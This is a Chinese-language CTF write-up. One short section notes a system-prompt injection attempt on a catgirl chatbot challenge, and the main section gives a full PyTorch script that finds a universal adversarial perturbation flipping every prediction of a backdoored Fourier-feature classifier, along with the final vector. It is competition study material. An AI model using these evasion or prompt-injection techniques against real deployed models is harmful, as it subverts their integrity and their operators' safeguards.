### 1. 猫猫今天笨笨了喵
哇还有猫娘
尝试下系统提示词注入攻击


![Image 0](./2026-3-1-furryctf/page_76_img_0.jpeg)

![Image 1](./2026-3-1-furryctf/page_76_img_1.png)

题完


### 2. RFF Backdoor Challenge

分析题目  

1. 先用 paytorch 加载 torchscript 模型  

2. 分析结构识别模型包含的缓冲区  

- W: 1024×37 的权重矩阵  
- b: 1024 维偏置向量  
- a: 1024 维线性分类器权重  
- c: 标量偏置  

向前传播原理  

logit = a·cos(Wx + b) + c  

prediction = sign(logit) # logit > 0 ? 1 : 0  

故添加扰动 sk 后  

φ(x+sk) = cos(W(x+sk) + b) = cos(Wx + b + Wsk)  

这里令 Wsk≈ π，cos(z+π) = -cos(z)，logit 变  
为 -logit + 2c  

若 |logit| > 2c，则符号翻转  

题目需要满足点  

1. 找 sk 使 Wsk ≈ π（或 π 的奇数倍）  

因为 a 可正负。Wsk ≈ π * sign(a)  

但 c = 0.28，2c = 0.56  

所以想要 -logit + 2c 变符号需要 |logit| > 0.56  

1. 首先试试线性最小二乘法  

```python
target = torch.full((1024,), np.pi, dtype=torch.float32)
result = torch.linalg.lstsq(W, target.unsqueeze(1))
sk_pi = result.solution.squeeze()
```

得到 sk 范围为 [-0.1837, 0.1458]

符合 ±0.25 边界范围，翻转率为 21.17%

1. 试试梯度下降法

``` python
sk = torch.zeros(37, requires_grad=True)

optimizer = torch.optim.Adam([sk], lr=0.01)

for epoch in range(1000):
    loss = 0
    for i in batch_indices:
        x = X[i]
        x_pert = torch.clamp(x + sk, -1.0, 1.0)
        logit_orig = model.forward_logit(x.unsqueeze(0))
        logit_pert = model.forward_logit(x_pert.unsqueeze(0))
        loss += torch.relu(1.0 + logit_pert * torch.sign(logit_orig))
        loss += torch.relu(1.0 + logit_pert *
torch.sign(logit_orig))
```

翻转率为96.8%无法全部翻转
1. lbfgs 优化法

``` python
optimizer = torch.optim.LBFGS([sk], lr=1.0, max_iter=20,
 history_size=100,
line_search_fn='strong_wolfe')
def closure():
 optimizer.zero_grad()
 sk.data = torch.clamp(sk.data, -epsilon, epsilon)

 loss = 0.0
 for i in range(600): # 使用所有样本
 x = X[i]
 x_pert = torch.clamp(x + sk, -1.0, 1.0)
 logit_orig = model.forward_logit(x.unsqueeze(0))
 logit_pert = model.forward_logit(x_pert.unsqueeze(0))
 loss += torch.relu(0.1 + logit_pert *
torch.sign(logit_orig))

 loss = loss / 600
 loss.backward()
```

在5 个epoch 中达到完全翻转

完整脚本
``` python
import torch

![Image 0](./2026-3-1-furryctf/page_79_img_0.jpeg)

import numpy as np

model = torch.jit.load('RFFBC-model.pt')
data = np.load('RFFBC-dataset.npz')
X = torch.from_numpy(data['X'])  # [600, 37]
y = torch.from_numpy(data['y'])  # [600]
print(f"数据使用{X.shape}")
print(f"c = {model.c.item():.6f}")

sk = torch.zeros(37, requires_grad=True)
epsilon = 0.25


def closure():
    optimizer.zero_grad()
    with torch.no_grad():
        sk.data = torch.clamp(sk.data, -epsilon, epsilon)
    loss = 0.0
    for i in range(600):
        x = X[i]
        x_pert = torch.clamp(x + sk, -1.0, 1.0)
        with torch.no_grad():
            logit_orig = model.forward_logit(x.unsqueeze(0))
            target_sign = torch.sign(logit_orig)
            if target_sign == 0:
                target_sign = 1.0
        logit_pert = model.forward_logit(x_pert.unsqueeze(0))
        loss += torch.relu(0.1 + logit_pert * target_sign)
    loss = loss / 600
    loss.backward()
    return loss

optimizer = torch.optim.LBFGS([sk], lr=1.0, max_iter=20,
history_size=100, line_search_fn='strong_wolfe')

print("l-bfgs优化")
for epoch in range(50):
    loss = optimizer.step(closure)
    if epoch % 5 == 0:
        sk_eval = sk.detach()
        flipped = 0
        for i in range(600):
            x = X[i]
            x_pert = torch.clamp(x + sk_eval, -1.0, 1.0)

            y_orig = model(x.unsqueeze(0)).item()
            y_pert = model(x_pert.unsqueeze(0)).item()
            if y_orig != y_pert:
                flipped += 1
        print(f"Epoch {epoch}: loss={loss.item():.6f},
flip={flipped}/600={flipped/600:.4f}")
        if flipped == 600:
            print("100% ")
            break
sk_final = sk.detach()
print(f"\nsk 范围[{sk_final.min():.6f}, {sk_final.max():.6f}]")
print(f"sk 规范 {torch.norm(sk_final):.6f}")
if torch.any(torch.abs(sk_final) > epsilon + 1e-6):
    print("sk 超限")
    sk_final = torch.clamp(sk_final, -epsilon, epsilon)
    print("限制边界")
flipped = 0
for i in range(600):
    x = X[i]
    x_pert = torch.clamp(x + sk_final, -1.0, 1.0)
    y_orig = model(x.unsqueeze(0)).item()
    y_pert = model(x_pert.unsqueeze(0)).item()
    if y_orig != y_pert:
        flipped += 1

print(f"\nFinal flip rate: {flipped}/600 = {flipped/600:.6f}")

if flipped == 600:
    sk_list = [f"{val:.10f}" for val in sk_final.numpy()]
    print("\n 成了SK :")
    print(','.join(sk_list))

else:
    print(f"\n 还有{600-flipped}个未翻转。")

    not_flipped = []
    for i in range(600):
        x = X[i]
        x_pert = torch.clamp(x + sk_final, -1.0, 1.0)
        y_orig = model(x.unsqueeze(0)).item()

        y_pert = model(x_pert.unsqueeze(0)).item()
        if y_orig == y_pert:
            not_flipped.append(i)

    print(f"还没翻转的{not_flipped[:10]}...")

    print("\n 试试额外的adam 优化策略")
    sk2 = sk_final.clone().requires_grad_(True)
    optimizer2 = torch.optim.Adam([sk2], lr=0.005)
    for epoch2 in range(1000):
        optimizer2.zero_grad()
        sk2.data = torch.clamp(sk2.data, -epsilon, epsilon)

        loss2 = 0.0
        for idx in not_flipped:
            x = X[idx]
            x_pert = torch.clamp(x + sk2, -1.0, 1.0)
            with torch.no_grad():
                logit_orig = model.forward_logit(x.unsqueeze(0))
                target_sign = torch.sign(logit_orig)
                if target_sign == 0:
                    target_sign = 1.0
            logit_pert = model.forward_logit(x_pert.unsqueeze(0))
            loss2 += torch.relu(0.5 + logit_pert * target_sign)
        loss2 = loss2 / max(len(not_flipped), 1)
        loss2.backward()
        optimizer2.step()
        if epoch2 % 100 == 0:
            sk_eval2 = sk2.detach()
            flipped2 = 0
            for i in range(600):
                x = X[i]
                x_pert = torch.clamp(x + sk_eval2, -1.0, 1.0)
                y_orig = model(x.unsqueeze(0)).item()
                y_pert = model(x_pert.unsqueeze(0)).item()
                if y_orig != y_pert:
                    flipped2 += 1
            print(f"  Adam epoch {epoch2}:
flip={flipped2}/600={flipped2/600:.4f}")
            if flipped2 == 600:
                sk_final2 = sk_eval2
                sk_list = [f"{val:.10f}" for val in
sk_final2.numpy()]
                print("\n 成了-adam SK:")
                print(','.join(sk_list))
                break
```
``` word
成功向量sk
-0.0803010538,-0.0855351165,-0.1174229607,-0.1136833131,-
0.0232775770,-0.0493248440,-0.0193986986,-0.1127497926,-
0.0270359740,-0.1816257536,-0.1642220467,-0.1170517504,-
0.1001767218,-0.1810759157,-0.1794596612,-0.1856129766,-
0.1777229607,-0.0887145847,-0.1832930595,-0.1549920887,-
0.1518876255,-0.0726791471,-0.1059116125,-0.2044871598,-
0.1505092829,-0.0319110602,-0.0520236008,-0.1032467633,-
0.1483903229,-0.1164644435,-0.1014188454,-0.1548476219,-
0.0417180024,-0.1715606898,-0.2097823620,-0.2245500386,-
0.0050010704
```
写个脚本交上去就行了
题完

## Osint
做出了
兽·聚

独游
没啥好写wp 的
搜就行了

